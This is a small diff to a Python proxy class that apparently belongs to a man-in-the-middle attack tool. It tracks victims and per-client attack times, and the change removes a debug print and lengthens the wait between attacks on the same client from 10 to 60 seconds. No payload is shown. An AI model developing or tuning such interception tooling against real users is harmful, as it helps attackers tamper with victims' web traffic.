@@ -102,7 +102,6 @@ class ClientRequest(Request):
             return self.PersistentData._PROXY
   
         if self.PersistentData.oldVictim(client):
-            print "old news"
             return self.PersistentData._PROXY
 
         if self.method != "GET":
@@ -111,7 +110,7 @@ class ClientRequest(Request):
         lastAttack = 0
         if client in self.PersistentData.lastAttackTime:
             lastAttack = self.PersistentData.lastAttackTime[client]
-        if time.time() - lastAttack < 10:
+        if time.time() - lastAttack < 60:
             return self.PersistentData._PROXY
 		
         if "google-analytics" in host or "favicon.ico" in path:
